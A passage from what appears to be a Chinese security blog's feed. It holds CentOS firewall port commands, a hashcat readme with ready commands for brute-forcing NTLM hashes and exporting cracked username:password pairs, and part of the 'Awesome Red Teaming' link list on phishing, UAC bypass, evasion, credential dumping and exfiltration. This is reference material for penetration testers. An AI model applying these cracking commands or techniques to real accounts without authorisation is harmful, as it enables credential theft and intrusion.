title="对一个端口的开启/查看/删除操作"></a>对一个端口的开启/查看/删除操作</h2><pre class="line-numbers language-cmd"><code class="language-cmd">添加:  firewall-cmd --zone=public --add-port=444/tcp --permanent    (--permanent永久生效，没有此参数重启后失效)重新载入:  firewall-cmd --reload查看:  firewall-cmd --zone=public --query-port=444/tcp删除:  firewall-cmd --zone=public --remove-port=444/tcp --permanent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashcat Readme</title>
      <link href="/2021/06/08/hashcat-readme.htm"/>
      <url>/2021/06/08/hashcat-readme.htm</url>
      
        <content type="html"><![CDATA[<p>#################################################################<br>&amp;               hashcat4.0.1 or 4.1.0                                                                            &amp;<br>#################################################################</p><span id="more"></span><p>hash r.txt文件格式   用户名:hash</p><p>–show 导出已破解的用户名:密码   outr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt </p></blockquote><p>–left 导出未破解的用户名:hash   leftr.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt</p></blockquote><p>增加密码复杂度命令破解leftr.txt（未破解的用户名:hash）</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote><p>结束以后导出未爆破用户名加hash.txt</p><blockquote><p>hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt</p></blockquote><blockquote><p>hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 –username c:\Users\hash\Desktop\1.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hashcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Teaming Tools</title>
      <link href="/2021/06/08/awesome-red-teaming.htm"/>
      <url>/2021/06/08/awesome-red-teaming.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Awesome-Red-Teaming"><a href="#Awesome-Red-Teaming" class="headerlink" title="Awesome Red Teaming"></a>Awesome Red Teaming</h1><p>List of Awesome Red Team / Red Teaming Resources</p><p>This list is for anyone wishing to learn about Red Teaming but do not have a starting point.</p><p>Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on <a href="https://attack.mitre.org/wiki/Main_Page">Mitre ATT&amp;CK</a></p><p>You can help by sending Pull Requests to add more information.</p><span id="more"></span><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul><li><a href="#-initial-access">Initial Access</a></li><li><a href="#-execution">Execution</a></li><li><a href="#-persistence">Persistence</a></li><li><a href="#-privilege-escalation">Privilege Escalation</a></li><li><a href="#-defense-evasion">Defense Evasion</a></li><li><a href="#-credential-access">Credential Access</a></li><li><a href="#-discovery">Discovery</a></li><li><a href="#-lateral-movement">Lateral Movement</a></li><li><a href="#-collection">Collection</a></li><li><a href="#-exfiltration">Exfiltration</a></li><li><a href="#-command-and-control">Command and Control</a></li><li><a href="#-embedded-and-peripheral-devices-hacking">Embedded and Peripheral Devices Hacking</a></li><li><a href="#-misc">Misc</a></li><li><a href="#-redteam-gadgets">RedTeam Gadgets</a></li><li><a href="#-ebooks">Ebooks</a></li><li><a href="#-training--free-">Training</a></li><li><a href="#-certification">Certification</a></li></ul><h2 id="↑-Initial-Access"><a href="#↑-Initial-Access" class="headerlink" title="↑ Initial Access"></a><a href="#table-of-contents">↑</a> Initial Access</h2><ul><li><a href="https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/">How To: Empire’s Cross Platform Office Macro</a></li><li><a href="https://www.blackhillsinfosec.com/phishing-with-powerpoint/">Phishing with PowerPoint</a></li><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/">PHISHING WITH EMPIRE</a></li><li><a href="https://hakshop.com/products/bash-bunny">Bash Bunny</a></li><li><a href="https://www.owasp.org/images/5/54/Presentation_Social_Engineering.pdf">OWASP Presentation of Social Engineering - OWASP</a></li><li><a href="https://www.redteamsecure.com/usb-drop-attacks-the-danger-of-lost-and-found-thumb-drives/">USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-WP.pdf">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23</a></li><li><a href="https://www.cobaltstrike.com/help-spear-phish">Cobalt Strike - Spear Phishing documentation</a></li><li><a href="https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/">Cobalt Strike Blog - What’s the go-to phishing technique or exploit?</a></li><li><a href="https://www.youtube.com/watch?v=V7UJjVcq2Ao">Spear phishing with Cobalt Strike - Raphael Mudge</a></li><li><a href="https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/">EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE</a></li><li><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/">Phishing for access</a></li><li><a href="https://4sysops.com/archives/excel-macros-with-powershell/">Excel macros with PowerShell</a></li><li><a href="https://phishme.com/powerpoint-and-custom-actions/">PowerPoint and Custom Actions</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">Macro-less Code Exec in MSWord</a></li><li><a href="https://medium.com/@malcomvetter/multi-platform-macro-phishing-payloads-3b688e8eff68">Multi-Platform Macro Phishing Payloads</a></li><li><a href="https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/">Abusing Microsoft Word Features for Phishing: “subDoc”</a></li><li><a href="https://enigma0x3.net/2017/07/13/phishing-against-protected-view/">Phishing Against Protected View</a></li><li><a href="https://fzuckerman.wordpress.com/2016/10/06/powershell-empire-stagers-1-phishing-with-an-office-macro-and-evading-avs/">POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS</a></li><li><a href="https://www.redteamsecure.com/the-plugbot-hardware-botnet-research-project/">The PlugBot: Hardware Botnet Research Project</a></li><li><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator">Luckystrike: An Evil Office Document Generator</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html">The Absurdly Underestimated Dangers of CSV Injection</a></li><li><a href="https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/">Macroless DOC malware that avoids detection with Yara rule</a></li><li><a href="https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279">Phishing between the app whitelists</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a></li><li><a href="https://www.social-engineer.org/">Social Engineer Portal</a></li><li><a href="http://www.darkreading.com/the-7-best-social-engineering-attacks-ever/d/d-id/1319411">7 Best social Engineering attack</a></li><li><a href="https://www.rsaconference.com/writable/presentations/file_upload/das-301_williams_rader.pdf">Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012</a></li><li><a href="https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/">USING THE DDE ATTACK WITH POWERSHELL EMPIRE</a></li><li><a href="https://www.kitploit.com/2018/02/pot-phishing-on-twitter.html">Phishing on Twitter - POT</a></li><li><a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/">Microsoft Office – NTLM Hashes via Frameset</a></li><li><a href="https://oddvar.moe/2017/09/13/defense-in-depth-writeup/">Defense-In-Depth write-up</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/05/07/Phishing.html">Spear Phishing 101</a></li></ul><h2 id="↑-Execution"><a href="#↑-Execution" class="headerlink" title="↑ Execution"></a><a href="#table-of-contents">↑</a> Execution</h2><ul><li><a href="https://msitpros.com/?p=3960">Research on CMSTP.exe,</a></li><li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">Windows oneliners to download remote payload and execute arbitrary code</a></li><li><a href="https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd">WSH Injection: A Case Study</a></li><li><a href="http://lockboxx.blogspot.com/2018/02/intro-to-using-gscript-for-red-teams.html">Gscript Dropper</a></li></ul><h2 id="↑-Persistence"><a href="#↑-Persistence" class="headerlink" title="↑ Persistence"></a><a href="#table-of-contents">↑</a> Persistence</h2><ul><li><a href="https://rastamouse.me/2018/03/a-view-of-persistence/">A View of Persistence</a></li><li><a href="https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353">hiding registry keys with psreflect</a></li><li><a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/">Persistence using RunOnceEx – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/">Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">Putting data in Alternate data streams and how to execute it – part 2</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html">WMI Persistence with Cobalt Strike</a></li><li><a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence</a></li><li><a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2)</a></li><li><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction</a></li></ul><h2 id="↑-Privilege-Escalation"><a href="#↑-Privilege-Escalation" class="headerlink" title="↑ Privilege Escalation"></a><a href="#table-of-contents">↑</a> Privilege Escalation</h2><h3 id="User-Account-Control-Bypass"><a href="#User-Account-Control-Bypass" class="headerlink" title="User Account Control Bypass"></a>User Account Control Bypass</h3><ul><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">First entry: Welcome and fileless UAC bypass,</a></li><li><a href="https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html">Exploiting Environment Variables in Scheduled Tasks for UAC Bypass,</a></li><li>Reading Your Way Around UAC in 3 parts:<br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html">Part 1.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html">Part 2.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html">Part 3.</a></li><li><a href="https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/">Bypassing UAC using App Paths,</a></li><li><a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/">“Fileless” UAC Bypass using sdclt.exe,</a></li><li><a href="https://habrahabr.ru/company/pm/blog/328008/">UAC Bypass or story about three escalations,</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking,</a></li><li><a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/">Bypassing UAC on Windows 10 using Disk Cleanup,</a></li><li><a href="http://www.freebuf.com/articles/system/116611.html">Using IARPUninstallStringLauncher COM interface to bypass UAC,</a></li><li><a href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3">Fileless UAC Bypass using sdclt</a></li><li><a href="https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/">Eventvwr File-less UAC Bypass CNA</a></li><li><a href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html">Windows 7 UAC whitelist</a></li></ul><h3 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h3><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md">Windows Privilege Escalation Checklist</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/03/17/COM-Moniker-Privesc.html">From Patch Tuesday to DA</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/">A Path for Privilege Escalation</a></li></ul><h2 id="↑-Defense-Evasion"><a href="#↑-Defense-Evasion" class="headerlink" title="↑ Defense Evasion"></a><a href="#table-of-contents">↑</a> Defense Evasion</h2><ul><li><a href="https://github.com/tyranid/DeviceGuardBypasses">Window 10 Device Guard Bypass</a></li><li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">App Locker ByPass List</a></li><li><a href="https://github.com/vysec/Windows-SignedBinary">Window Signed Binary</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html">Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files)</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html">Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations</a></li><li><a href="https://bneg.io/2017/07/26/empire-without-powershell-exe/">Empire without powershell</a></li><li><a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/">Powershell without Powershell to bypass app whitelist</a></li><li><a href="https://github.com/secretsquirrel/SigThief">MS Signed mimikatz in just 3 steps</a></li><li><a href="https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/">Hiding your process from sysinternals</a></li><li><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec">code signing certificate cloning attacks and defenses</a></li><li><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565">userland api monitoring and code injection detection</a></li><li><a href="https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/">In memory evasion</a></li><li><a href="https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff">Bypassing AMSI via COM Server Hijacking</a></li><li><a href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/">process doppelganging</a></li><li><a href="http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html">Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5</a></li><li><a href="https://cybersyndicates.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/">VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION</a></li><li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">Putting data in Alternate data streams and how to execute it</a></li><li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">AppLocker – Case study – How insecure is it really? – Part 1</a></li><li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">AppLocker – Case study – How insecure is it really? – Part 2</a></li><li><a href="https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2018/01/03/office-365-safe-links-bypass/">Office 365 Safe links bypass</a></li><li><a href="https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/">Windows Defender Attack Surface Reduction Rules bypass</a></li><li><a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/">Bypassing Device guard UMCI using CHM – CVE-2017-8625</a></li><li><a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/">Bypassing Application Whitelisting with BGInfo</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/10/cloning-captive-portals.html">Cloning and Hosting Evil Captive Portals using a Wifi PineApple</a></li><li><a href="https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/">https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/</a></li><li><a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e">mavinject.exe Functionality Deconstructed</a></li></ul><h2 id="↑-Credential-Access"><a href="#↑-Credential-Access" class="headerlink" title="↑ Credential Access"></a><a href="#table-of-contents">↑</a> Credential Access</h2><ul><li><a href="https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/">Windows Access Tokens and Alternate credentials</a></li><li><a href="https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/">Bringing the hashes home with reGeorg &amp; Empire</a></li><li><a href="https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/">Intercepting passwords with Empire and winning</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-1/">Local Administrator Password Solution (LAPS) Part 1</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-2/">Local Administrator Password Solution (LAPS) Part 2</a></li><li><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/">USING A SCF FILE TO GATHER HASHES</a></li><li><a href="https://www.harmj0y.net/blog/">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/">Offensive Encrypted Data Storage</a></li><li><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">Practical guide to NTLM Relaying</a></li><li><a href="https://adsecurity.org/?p=2053">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</a></li><li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes</a></li></ul><h2 id="↑-Discovery"><a href="#↑-Discovery" class="headerlink" title="↑ Discovery"></a><a href="#table-of-contents">↑</a> Discovery</h2><ul><li><a href="https://www.owasp.org/images/4/4b/Red_Team_Operating_in_a_Modern_Environment.pdf">Red Team Operating in a Modern Environment</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/">My First Go with BloodHound</a></li><li><a href="https://wald0.com/?p=68">Introducing BloodHound</a></li><li><a href="https://wald0.com/?p=179">A Red Teamer’s Guide to GPOs and OUs</a></li><li><a href="https://wald0.com/?p=14">Automated Derivative Administrator Search</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/">A Pentester’s Guide to Group Scoping</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/local-group-enumeration/">Local Group Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/">The PowerView PowerUsage Series #1 - Mass User Profile Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/">The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/">The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/">The PowerView PowerUsage Series #4 – Finding cross-trust ACEs</a></li><li><a href="http://threat.tevora.com/aggressor-powerview/">Aggressor PowerView</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/">Lay of the Land with BloodHound</a></li><li><a href="https://adsecurity.org/?p=3658">Scanning for Active Directory Privileges &amp; Privileged Accounts</a></li><li><a href="https://adsecurity.org/?p=3164">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</a></li><li><a href="https://bohops.com/2017/12/02/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/">Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation</a></li><li><a href="https://pentestlab.blog/2018/06/04/spn-discovery/">SPN Discovery</a></li></ul><h2 id="↑-Lateral-Movement"><a href="#↑-Lateral-Movement" class="headerlink" title="↑ Lateral Movement"></a><a href="#table-of-contents">↑</a> Lateral Movement</h2><ul><li><a href="https://rastamouse.me/2017/05/a-citrix-story/">A Citrx Story</a></li><li><a href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/">Jumping Network Segregation with RDP</a></li><li><a href="http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/">Pass hash pass ticket no pain</a></li><li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">Abusing DNSAdmins privilege for escalation in Active Directory</a></li><li><a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html">Using SQL Server for attacking a Forest Trust</a></li><li><a href="https://www.youtube.com/watch?v=Pn7GWRXfgeI">Extending BloodHound for Red Teamers</a></li><li><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/">OPSEC Considerations for beacon commands</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/">My First Go with BloodHound</a></li><li><a href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws">Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws</a></li><li><a href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/">Lateral movement using excel application and dcom</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/">Lay of the Land with BloodHound</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li><a href="https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/">Agentless Post Exploitation</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a>   </li><li><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">Targeted Kerberoasting</a></li><li><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">Kerberoasting Without Mimikatz</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/">Abusing Active Directory Permissions with PowerView</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Getting the goods with CrackMapExec: Part 1</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html">Getting the goods with CrackMapExec: Part 2</a></li><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction</a></li><li><a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement</a></li><li><a href="https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944">a guide to attacking domain trusts</a></li><li><a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Outlook Home Page – Another Ruler Vector</a></li><li><a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Outlook Forms and Shells</a></li><li><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32</a></li><li><a href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html">LethalHTA - A new lateral movement technique using DCOM and HTA</a></li><li><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/">Abusing DCOM For Yet Another Lateral Movement Technique</a></li></ul><h2 id="↑-Collection"><a href="#↑-Collection" class="headerlink" title="↑ Collection"></a><a href="#table-of-contents">↑</a> Collection</h2><ul><li><a href="https://oddvar.moe/2017/01/24/accessing-clipboard-from-the-lock-screen-in-windows-10/">Accessing clipboard from the lock screen in Windows 10 Part 1</a></li><li><a href="https://oddvar.moe/2017/01/27/access-clipboard-from-lock-screen-in-windows-10-2/">Accessing clipboard from the lock screen in Windows 10 Part 2</a></li></ul><h2 id="↑-Exfiltration"><a href="#↑-Exfiltration" class="headerlink" title="↑ Exfiltration"></a><a href="#table-of-contents">↑</a> Exfiltration</h2><ul><li><a href="https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822">DNS Data exfiltration — What is this and How to use?</a></li><li><a href="http://resources.infosecinstitute.com/dns-tunnelling/">DNS Tunnelling</a></li><li><a href="https://securityonline.info/sg1-swiss-army-knife-for-data-encryption-exfiltration-covert-communication/?utm_source=ReviveOldPost&utm_medium=social&utm_campaign=ReviveOldPost">sg1: swiss army knife for data encryption, exfiltration &amp; covert communication</a></li><li><a href="https://n0where.net/data-exfiltration-over-dns-request-covert-channel-dnsexfiltrator">Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator</a></li><li><a href="https://github.com/PaulSec/DET">DET (extensible) Data Exfiltration Toolkit</a></li><li><a href="https://www.notsosecure.com/data-exfiltration-formula-injection/">Data Exfiltration via Formula Injection Part1</a></li></ul><h2 id="↑-Command-and-Control"><a href="#↑-Command-and-Control" class="headerlink" title="↑ Command and Control"></a><a href="#table-of-contents">↑</a> Command and Control</h2><h3 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h3><ul><li><a href="https://www.xorrior.com/Empire-Domain-Fronting/">Empre Domain Fronting</a></li><li><a href="https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks">Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten</a></li><li><a href="https://github.com/rvrsh3ll/FindFrontableDomains">Finding Frontable Domain</a></li><li><a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/">TOR Fronting – Utilising Hidden Services for Privacy</a></li><li><a href="https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/">Simple domain fronting PoC with GAE C2 server</a></li><li><a href="https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/">Domain Fronting Via Cloudfront Alternate Domains</a></li><li><a href="https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html">Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)</a></li><li><a href="https://groups.google.com/forum/#!topic/traffic-obf/7ygIXCPebwQ">Google Groups: Blog post on finding 2000+ Azure domains using Censys</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/">SSL Domain Fronting 101</a></li><li><a href="https://www.peew.pw/blog/2018/2/22/how-i-identified-93k-domain-frontable-cloudfront-domains">How I Identified 93k Domain-Frontable CloudFront Domains</a></li><li><a href="https://medium.com/@vysec.private/validated-cloudfront-ssl-domains-27895822cea3">Validated CloudFront SSL Domains</a></li><li><a href="https://www.mindpointgroup.com/blog/pen-test/cloudfront-hijacking/">CloudFront Hijacking</a></li><li><a href="https://github.com/MindPointGroup/cloudfrunt">CloudFrunt GitHub Repo</a></li></ul><h3 id="Connection-Proxy"><a href="#Connection-Proxy" class="headerlink" title="Connection Proxy"></a>Connection Proxy</h3><ul><li><a 